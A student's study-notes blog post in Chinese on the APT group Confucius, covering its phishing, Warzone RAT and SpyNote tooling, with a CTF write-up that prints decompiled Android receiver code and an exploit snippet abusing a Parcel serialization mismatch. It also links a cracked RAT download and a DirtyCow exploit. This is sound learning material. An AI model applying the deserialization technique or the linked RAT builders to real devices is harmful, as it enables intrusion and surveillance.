---
title: 对APT组织Confucius的分析
date: 2021-11-27 20:03:15
updated: 2021-11-28
categories: 威胁情报
tags: null
layout: post
---

​	溯源取证的课程已经结束了，但是自己单靠上课听讲并没有学到很多能够实际应用的知识，两次大作业也没有比较实际的产出，有点愧疚。正好近期有需要整理APT组织相关信息的任务，并且溯源课程也快要考试了，此处以实际的APT组织Confucius为例，进行一下系统的学习，希望能够提高自己在溯源取证方面的知识和能力。

​	恶意样本分析可以使用在线环境AnyRun。地址：https://app.any.run / 使用教程：https://www.anquanke.com/post/id/100472， 但是自己尝试了一下体验感不是很好，还是使用虚拟机来分析。



## 一、组织简介

​	APT组织”魔罗桫”（又名为Confucius、提菩），有印度背景，2013年首次出现，是一个长期针对中国，巴基斯坦，尼泊尔等地区，主要针对政府机构，军工企业，核能行业等领域进行网络间谍活动的活跃组织。

​	该组织与Patchwork存在一定的关联。





## 二、常用攻击方式

​	参考奇安信红雨滴团队分析报告 https://ti.qianxin.com/uploads/2020/09/17/69da886eecc7087e9dac2d3ea4c66ba8.pdf

### 1、邮件结合钓鱼网站定向攻击

​	没太多技术性的东西，但一些钓鱼的小技巧很有意思。



### 2、邮件木马附件定向攻击

​	通常用恶意宏来下载和执行恶意文件。

​	例如：Warzone RAT，使用了UAC绕过技术。关于[Confucius使用Waezone RAT的报告可以看这篇文章](https://socprime.com/blog/warzone-rat-malware-used-by-confucius-apt-in-targeted-attacks/)

​	样本下载地址：[GitHub - PWN-Hunter/WARZONE-RAT-1.71: WARZONE RAT 1.71 CRACKED by UNKNOWN-Remote Administration Trojan-RAT](https://github.com/PWN-Hunter/WARZONE-RAT-1.71)



**bypass UAC**

​	使用sdclt.exe。可参考[知乎上的教程](https://zhuanlan.zhihu.com/p/29325846)，[github上原作者](https://gist.github.com/netbiosX/54a305a05b979e13d5cdffeba5436bcc)2019年称，在最新的windows10上已经不能用了，自己在windows10上进行尝试发现确实不能成功。([无法执行.ps1参考该文章](https://blog.csdn.net/jinhaijing/article/details/85004126))

​	接下来的分析操作参考[uptycs.com的这篇文章](https://www.uptycs.com/blog/warzone-rat-comes-with-uac-bypass-technique)，这种技术属于T1548.002，并且现在由于windows的系统设置，很多方法已经不能用了。具体原因是：

```tex
There are many UAC bypass techniques that are not effective on Windows 10 because of the default file system restrictions. A 32-bit application can’t access the native c:\windows\system32 directory because the operating system redirects the request to c:\windows\SysWOW64. Sdclt.exe and other UAC bypass binaries are (not???) 64-bit applications and are not available in the SysWOW64 directory.
```

​	本RAT使用了另一种机制Wow64DisableWow64FsRedirection API，来禁用上文提到的重定向操作。

![1-Wow64](/Analysis of the APT organization Confuxius/1-Wow64.png)

​	根据函数的交叉引用定位到sub_14001B634，但是之后就不知道怎么分析了。参考文章给出之后修改注册表，但是没找到相应的代码在哪里，不知道是不是版本的原因。

​	随后分析了其各项功能，但是我还不太会分析，所以此处只看了一下别人的文章，没有自己手工分析。

​	关于早期版本的UAC绕过技术，[这篇文章](https://research.checkpoint.com/2020/warzone-behind-the-enemy-lines/)分析地也很详细，不过后半部分我没具体看了，还是水平不够理解不了。



​	前期可以利用多种漏洞进行木马的下载，如此处使用了公式编辑器漏洞。2021年1月，uptycsy又发布了一篇关于[Confucius使用Warzone RAT](https://www.uptycs.com/blog/confucius-apt-deploys-warzone-rat)的文章，文中还提到了模版注入技术(用于下载RTF，随后下载Warzone RAT)和C2 TLL。其使用到了CVE-2018-0802 公式编辑器漏洞，是一个栈溢出漏洞，之后有时间的话可以复现一下。(之后 == never)

​	一篇相关的中文[样本分析文章](http://cn-sec.com/archives/271661.html)，对RAT的功能的分析较为详尽。



### 3、安卓APK攻击

​	奇安信报告指出，其改写了开源安卓木马 spynote进行攻击。

​	2017年，其又使用了ChatSpy。

​	2021年2月，LookOut发布关于其使用SunBird和Hornbill的文章，称其在更早的时间就开始使用这些恶意软件了。SunBird有RAT功能，Hornbill仅用来监控，提取其运营商感兴趣的数据。具体可以参考[这篇](https://blog.lookout.com/lookout-discovers-novel-confucius-apt-android-spyware-linked-to-india-pakistan-conflict)，但其中没有技术性的分析。SunBird和BuzzOut可能是由同一拨人开发的。目前也没找到关于这两个恶意软件的较为详细的技术分析文章，大多都是引用的LookOut的那篇。

​	由于网上关于spynote的分析文章较多，此处对其进行分析。(先去补充了安卓的基础知识)。分析spynote 5.0，从GitHub下载。

​	**spynote 5.0使用教程：**参考[freebuf的文章](https://www.freebuf.com/sectool/164077.html)。文中内网穿透工具网络通不能再使用了，使用花生壳。

生成的木马功能设置如下图所示，build的时候，选择的patch为Patch-release，没有选Patch-StaminaMode-release (因为手误)。但是进度条一直卡在那里不懂，查看freebuf文章的评论，说是.net的版本需要为4.5.2，但是win10又没办法安装这个版本的....尝试安装一个win7的虚拟机，反正其他地方也要用到。

<img src="/Analysis of the APT organization Confuxius/2-function.png" alt="2-function" style="zoom:50%;" />

​	算了这个太难弄了...大部分时间都花在配置环境上了，有点得不偿失。还是要把主要的精力花在恶意代码分析上面。关于spynote可参考的文章如下：

​	[spynote5.0 使用教程-freebuf](https://www.freebuf.com/sectool/164077.html)

​	[SpyNote5.0 Client_APK逆向分析-蚁景科技](https://www.jianshu.com/p/bb8a074fc28f)，大致做了一些分析，指出回传信息时用到了很多字符串分隔符，攻击者根据分隔符来判断传回的是什么信息。

​	[对SpyNote远程访问木马的深入分析-BULLDOGJOB](https://bulldogjob.pl/articles/1200-an-in-depth-analysis-of-spynote-remote-access-trojan) 指出，恶意软件在成功安装后，将安装嵌入在 res/raw/google.apk的apk 文件中的合法应用程序。如果不包含其他的应用程序，此文件夹为空。开机自启动：BOOT_COMPLETED。还有其他各个模块的分析，较为详细。文章结尾还有ATT&CK技术的总结。

​	[SpyNote间谍软件利用“新冠肺炎”传播恶意程序-暗影实验室](https://www.anquanke.com/post/id/203264#h2-2) 也做了比较详细的分析，但是和上面的文章相比没有啥较新的内容。

其他文章：

​	[卡巴斯基：2022年APT威胁趋势预测-安全内参](https://www.secrss.com/articles/36740)

​	[Android恶意软件分析](https://www.anquanke.com/post/id/85225) 翻译文章，原文很好，翻译得不是很通顺。提到一个很好用的模拟器：Santoku。静态分析了getReverseShell()、copyFile()和changefilepermissions()三个功能。动态抓包分析nc通信过程。分析的是最基础的建立连接的过程。

​	看到这里的时候，正好有一项作业是复现apk漏洞，参考 [安全客翻译的一套教程](http://bobao.360.cn/learning/detail/122.html) 进行实践。

​		原文1:http://resources.infosecinstitute.com/android-hacking-security-part-1-exploiting-securing-application-components/

​		原文2: https://resources.infosecinstitute.com/topic/android-hacking-security-part-2-content-provider-leakage/

​		期间安装了sdk，安装路径：C:\Users\my\AppData\Local\Android\android-sdk，但是sdk manager下载内容的时候下载失败。

​		看了14篇参考文章，没人比我更懂安卓HACKING！！我觉得这时候可以开始写作业了～

​		又看了[这篇](https://xuanxuanblingbling.github.io/ctf/android/2018/02/12/Android_app_part1/)，WebView部分有点偏向浏览器漏洞，没太明白。

​		后来问了一些大佬，他们推荐了一道关于安卓pwn的ctf题目2020-De1CTF-Pwn-BroadCastTest，考察内容：反序列化。[题目下载链接](https://ctftime.org/task/11502)

1、得到源码

​	sudo ./d2j-dex2jar.sh classes2.dex

​	参考：https://blog.csdn.net/MyHeaven7/article/details/51668479

​	IDEA可以直接查看class文件。

​	也可以使用jadx，安装教程参考：https://www.jianshu.com/p/3cc4e861b3db，但是目前编译失败了。



2、重要源码如下：

```java
MyReceiver1

public class MyReceiver1 extends BroadcastReceiver {
    public MyReceiver1() {
    }
//var 1是context，var2 是 intent。
    public void onReceive(Context var1, Intent var2) {
        int var3 = var2.getIntExtra("id", 0);
        String var8 = var2.getStringExtra("data");
        if (var3 != 0 && var8 != null) {
            try {
                byte[] var4 = Base64.decode(var8, 0);
                Parcel var9 = Parcel.obtain();
                var9.unmarshall(var4, 0, var4.length);
                var9.setDataPosition(0);
                Intent var10 = new Intent();
                var10.setAction("com.de1ta.receiver2");
                var10.setClass(var1, MyReceiver2.class);
                Bundle var5 = new Bundle();
                var5.readFromParcel(var9);
                var10.putExtra("id", var3);
                var10.putExtra("message", var5);
                var1.sendBroadcast(var10);
                return;
            } catch (Exception var6) {
                Log.e("De1taDebug", "exception:", var6);
                StringBuilder var7 = new StringBuilder();
                var7.append("Failed in Receiver1! id:");
                var7.append(var3);
                Log.d("De1ta", var7.toString());
            }
        }

    }
}

```



```java
MyReceiver2


package com.de1ta.broadcasttest;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MyReceiver2 extends BroadcastReceiver {
    public MyReceiver2() {
    }

    public void onReceive(Context var1, Intent var2) {
        Bundle var4 = var2.getBundleExtra("message");
        int var3 = var2.getIntExtra("id", 0);
        String var7 = var4.getString("command");
        StringBuilder var6;
        if (var3 != 0 && var7 != null && !var7.equals("getflag")) {
            try {
                var2 = new Intent();
                var2.setAction("com.de1ta.receiver3");
                var2.setClass(var1, MyReceiver3.class);
                var2.putExtra("id", var3);
                var2.putExtra("message", var4);
                var1.sendBroadcast(var2);
            } catch (Exception var5) {
                Log.e("De1taDebug", "exception:", var5);
                var6 = new StringBuilder();
                var6.append("Failed in Receiver2! id:");
                var6.append(var3);
                Log.d("De1ta", var6.toString());
            }

        } else {
            var6 = new StringBuilder();
            var6.append("Failed in Receiver2! id:");
            var6.append(var3);
            Log.d("De1ta", var6.toString());
        }
    }
}
```



```java
MyReceiver3

//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.de1ta.broadcasttest;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class MyReceiver3 extends BroadcastReceiver {
    public MyReceiver3() {
    }

    public void onReceive(Context var1, Intent var2) {
        String var4 = var2.getBundleExtra("message").getString("command");
        int var3 = var2.getIntExtra("id", 0);
        StringBuilder var5;
        if (var3 != 0 && var4 != null && var4.equals("getflag")) {
            var5 = new StringBuilder();
            var5.append("Congratulations! id:");
            var5.append(var3);
            Log.d("De1ta", var5.toString());
        } else {
            var5 = new StringBuilder();
            var5.append("Failed in Receiver3! id:");
            var5.append(var3);
            Log.d("De1ta", var5.toString());
        }
    }
}
```

查看MainActivity

```java

package com.de1ta.broadcasttest;

import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import android.os.Parcelable.Creator;
import android.support.v7.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    public MainActivity() {
    }

    protected void onCreate(Bundle var1) {
        super.onCreate(var1);
        this.setContentView(2131296284);
    }


    static class Message implements Parcelable {
        public static final Creator<MainActivity.Message> CREATOR = new Creator<MainActivity.Message>() {
            public MainActivity.Message createFromParcel(Parcel var1) {
                return new MainActivity.Message(var1);
            }

            public MainActivity.Message[] newArray(int var1) {
                return new MainActivity.Message[var1];
            }
        };
        String bssid;
        public int burstNumber;
        public int frameNumberPerBurstPeer;
        public int measurementFrameNumber;
        public int measurementType;
        public int retryAfterDuration;
        public int rssi;
        public int rssiSpread;
        public long rtt;
        public long rttSpread;
        public long rttStandardDeviation;
        public int status;
        public int successMeasurementFrameNumber;
        public long ts;
        public int txRate;

//实现了Parcel接口
      //var1 是 in
        public Message(Parcel var1) {
            this.bssid = var1.readString();
            this.burstNumber = var1.readInt();
            this.measurementFrameNumber = var1.readInt();
            this.successMeasurementFrameNumber = var1.readInt();
            this.frameNumberPerBurstPeer = var1.readInt();
            this.status = var1.readInt();
            this.measurementType = var1.readInt();
            this.retryAfterDuration = var1.readInt();
            this.ts = var1.readLong();
            this.rssi = var1.readInt();
            this.rssiSpread = var1.readInt();
            this.txRate = var1.readInt(); //读取：int
            this.rtt = var1.readLong();
            this.rttStandardDeviation = var1.readLong();
            this.rttSpread = var1.readLong(); //读取：long，下4个字节也读入
        }

        public int describeContents() {
            return 0;
        }

      
      //封包的时候写入到bundle
        public void writeToParcel(Parcel var1, int var2) {
            var1.writeString(this.bssid);
            var1.writeInt(this.burstNumber);
            var1.writeInt(this.measurementFrameNumber);
            var1.writeInt(this.successMeasurementFrameNumber);
            var1.writeInt(this.frameNumberPerBurstPeer);
            var1.writeInt(this.status);
            var1.writeInt(this.measurementType);
            var1.writeInt(this.retryAfterDuration);
            var1.writeLong(this.ts);
            var1.writeInt(this.rssi);
            var1.writeInt(this.rssiSpread);
            var1.writeByte((byte)this.txRate); //强制类型转换
            var1.writeLong(this.rtt);
            var1.writeLong(this.rttStandardDeviation);
            var1.writeInt((int)this.rttSpread);//强制类型转换
        }
    }
}
```



测试：

```kotlin
 Message() {
        this.bssid = "bssid";
        this.burstNumber = 1;
        this.frameNumberPerBurstPeer = 2;
        this.measurementFrameNumber = 3;
        this.measurementType = 4;
        this.retryAfterDuration = 5;
        this.rssi = 6;
        this.rssiSpread = 7;
        this.rtt = 8;
        this.rttSpread = 9;
        this.rttStandardDeviation = 10;
        this.status = 11;
        this.successMeasurementFrameNumber = 12;
        this.f32ts = 13;
        this.txRate = 0xff;
}
```

广播

```csharp
 public void sendData(Context context) {
        Bundle bundle = new Bundle();
        bundle.putParcelable("msg", new Message());
        bundle.putString("command","getflag");
        Parcel parcel = Parcel.obtain();
        parcel.writeBundle(bundle);
        parcel.setDataPosition(0);
        byte[] bytes = parcel.marshall();

        StringBuilder buffer = new StringBuilder();
        for (byte b : bytes) {
            buffer.append(String.format("%02x", b));
        }

        Log.d(TAG, buffer.toString());
        Log.d(TAG, new String(Base64.encode(bytes, 0)));
        Intent intent = new Intent("com.happy.parcelpwn.receiver1");
        intent.putExtra("id", (int) 6666);
        intent.putExtra("data", new String(Base64.encode(bytes, 0)));
        context.sendBroadcast(intent);
    }
```

构造exp

```cpp
bundle.putParcelable("66", new Message());
bundle.putIntArray("\3\00\3", new int[]{0x12, 0x18, 7, 6, 5, 4, 3, 2, 1,
                15, 16, 17, 18, 19, 20, 21, 22, 23}); // length : 0x12 :int array type
bundle.putString("\7\0command", "\07\0command\0\0\0\7\0getflags");
```

66是message对象的键，值也有一定的影响。

​	向远端发起攻击，使用adb shell。

​	[安全客分析文章](https://www.anquanke.com/post/id/204393#h2-7)

​	[官方wp](https://r3kapig.com/writeup/20200507-De1taCTF-BroadcastTest/)

​	[简书-by HAPPYers](https://www.jianshu.com/p/737198ff1de8)

​	看到这里，决定下一个安卓虚拟机。[安装教程](https://www.jb51.net/article/187054.htm)，[下载地址](https://www.fosshub.com/Android-x86.html?dwl=android-x86_64-9.0-r2.iso)

​	但是启动的时候，卡在了启动界面。安装失败！！！不知道是不是安卓的版本问题，放弃。本地的mumu模拟器可以正常使用了，遂用其。

​	参考安全客的文章，不会正常出现Congratulations，问了一位安卓大佬，他说他也是这样的结果，apk会闪退。应该不是我的问题了，可能是环境或apk本身的问题，不管了就先这样交了，在报告上说明了不能得到flag，会闪退。我太拉了太拉了，啊啊啊太菜了1551！！！



## 三、样本分析

还是参考奇安信红雨滴团队的[分析文章](https://ti.qianxin.com/uploads/2020/09/17/69da886eecc7087e9dac2d3ea4c66ba8.pdf)。

1、SFX样本---AsyncRat

名称：India's 5th Gen Fighter Jet Report.exe



2、宏样本---AsyncRat



3、RTF恶意文档---DeMnu混淆器



4、模板注入攻击---DeMnu混淆器，AsyncRat、SecureCRT



5、Dephi注入器--- Ssphi Injector，下载DarktrackRAT



## 四、其他文章汇总



Confucius相关

[样本分析---钓鱼样本分析---byDemonsec](https://www.ggsec.cn/Confucius.html)

[样本分析---巴基斯坦政府遭到疑似Confucius组织的攻击分析---by安全内参](https://www.secrss.com/articles/12260)

[样本分析---Metasploit和spynote对比---byMG193.7](https://www.cnblogs.com/aldys4/p/14893079.html) 从各方面来看，Metasploit都更优秀。

[样本分析---unit42对spynote的分析](https://unit42.paloaltonetworks.com/unit42-spynote-android-trojan-builder-leaked/) 很简单地描述了一下，信息量不大。



非Confucius

[一个病毒样本分析的全过程---by信安之路](https://cloud.tencent.com/developer/article/1180870)  分析的很详细，提到一种自启动的方式是替换掉屏保程序！妙啊～

[Android恶意样本WifiKillerpro.apk锁机软件分析](https://bbs.pediy.com/thread-268060.htm) 分析的也比较详细，并且提供了解决方案。

[安卓漏洞 CVE 2017-13287 复现分析](https://www.anquanke.com/post/id/197710#h2-0) 发表于安全客，很震惊，看了几天看不懂的文章竟然是同学写的！orz

[应用克隆漏洞---by平安银行](http://cdn-test.life.pingan.com/ilifecore/piluwenjian/20190124113933203919.pdf)

[DirtyCow漏洞复现](https://blog.csdn.net/u012206617/article/details/114069743)             [Github](https://gitcode.net/mirrors/Brucetg/DirtyCow-EXP?utm_source=csdn_github_accelerator)



## 五、APT组织情报研究年鉴

阅读一下绿盟和广州大学联合发布的这篇报告，对21年的APT攻击进行了分析，文章地址如下：http://blog.nsfocus.net/wp-content/uploads/2022/01/APT.pdf



### 1、情报图鉴与情报监视侦察 ISR

说了一下情报很重要。



### 2、宏观态势

说了一下APT攻击很复杂。



### 3、情报 Intelligence 篇

APT阻止利用的漏洞清单如下

![3-vul1](/Analysis of the APT organization Confuxius/3-vul1.png)

![4-vul2](/Analysis of the APT organization Confuxius/4-vul2.png)


 ATT&CK

知识图谱构建威胁情报



### 4、监视 Surveillance 篇

一些科研的方法和成果。



### 5、Reconnaissance 篇

汇总了几篇文章

[APT雇佣军组织LOREC53发动对格鲁吉亚政府的钓鱼文件攻击](http://blog.nsfocus.net/apt-lorec/)

[KEKSEC组织运营网络再添新成员：LOLFME僵尸网络](http://blog.nsfocus.net/keksec-lolfme/)

[正在进行：APT组织FIN7利用windows11话题诱饵的鱼叉攻击活动](https://zhuanlan.zhihu.com/p/391030255)

[10月下旬APT组织PATCHWORK伪装巴基斯坦联邦税务局的鱼叉攻击活动](http://blog.nsfocus.net/apt-patchwork/)



### 6、2021 年 APT 组织 情报图鉴

列举了很多APT组织。



一点小评价：首先图片清晰度很差，影响阅读体验，这可能是因为插入的图片过多会导致文件的体积较大，不得不降低图片质量。但是对用户来说图片看不清晰就会觉得很难受。还有最后的APT组织列举感觉没必要，可以放个网上现有的汇总链接。





## 六、其他资源汇总

1、[APT组织汇总表格](https://docs.google.com/spreadsheets/u/1/d/1H9_xaxQHpWaa4O_Son4Gx0YOIzlcBWMsdvePFX68EKU/pubhtml#)

2、[MITRE ATT&CK-APT数据库](https://attack.mitre.org/groups/)

3、[bazaar-恶意样本数据库](https://bazaar.abuse.ch/browse/)

4、[github上恶意软件资源](https://github.com/rshipp/awesome-malware-analysis/blob/main/恶意软件分析大合集.md)

5、[atomic-red-team](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics)



总结：只是汇总了一下近期看的文章，该篇文章所包含的内容也已经超过了题目的范围(指跑题了)，但是懒得再改了。或许人生也是这样，不会按照你设想的道路走下去。学习之路任重道远～加油哇！！



## 七、2022-07-11更新

深信服疑似监测到该组织的新一轮攻击活动，并且认为该攻击活动与南亚其他组织如`SideWinder`和`Patchwork`也存在一定关联。此次攻击活动与之前的没有太大变化，主要还是通过钓鱼邮件来进行。

参考：https://www.secpulse.com/archives/182403.html